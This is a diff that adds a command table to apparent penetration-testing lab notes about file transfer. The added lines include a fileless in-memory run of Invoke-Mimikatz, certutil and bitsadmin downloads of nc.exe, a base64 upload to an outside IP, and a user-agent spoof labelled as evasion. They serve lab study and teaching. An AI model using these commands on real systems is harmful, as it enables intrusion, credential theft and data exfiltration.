@@ -45,6 +45,26 @@ Alternate ports, legit User-Agents, base64/`certutil -encode`, compress+encrypt 
 ## My notes / lab output
 Filled in as I run these on lab targets.
 
+## Full command reference (source notes)
+Complete transfer command set — nothing trimmed.
+
+| Command | Description |
+|---|---|
+| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
+| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')` | Execute a file in memory (PowerShell, fileless) |
+| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell (base64 body) |
+| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download via Bitsadmin |
+| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download via Certutil |
+| `certutil.exe -urlcache -split -f http://<ip>/nc.exe nc.exe` | Download via Certutil (urlcache variant) |
+| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download with Wget |
+| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download with cURL |
+| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download with PHP |
+| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file via SCP |
+| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file via SCP |
+| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | IWR with a Chrome User-Agent (evasion) |
+
+Host a quick server to pull from: `python3 -m http.server 80` · `impacket-smbserver share .` · `php -S 0.0.0.0:80`.
+
 ## 2. Setup
 - Attack box: (Pwnbox / Kali VM)
 - Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)
